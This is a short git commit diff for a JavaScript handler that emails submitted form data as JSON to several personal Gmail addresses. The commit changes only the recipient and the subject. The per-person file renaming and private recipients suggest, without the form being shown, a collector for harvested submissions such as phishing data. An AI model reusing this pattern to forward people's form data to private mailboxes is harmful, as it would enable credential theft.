107740c68551fc5d77e2eff9ece43fc515f47d70
tufailacjsm37-design <tufailacjsm37@gmail.com>
2026-03-03 17:31:14 +0500

    Update and rename ahtsham2.js to zohaib.js

--- zohaib.js
+++ zohaib.js
@@ -37,8 +37,8 @@ export default async function handler(req, res) {
   try {
     await transporter.sendMail({
       from: `"PROFESSOR" <dardhame1@gmail.com>`,
-      to: "ta0134750@gmail.com,ahteshamali88888@gmail.com",
-      subject: "ahtsham2",
+      to: "ta0134750@gmail.com,zohaibniz123@gmail.com",
+      subject: "zohaib",
       text: JSON.stringify(formData, null, 2),
       html: `<h3>New submission from Asif</h3><pre>${JSON.stringify(
         formData,
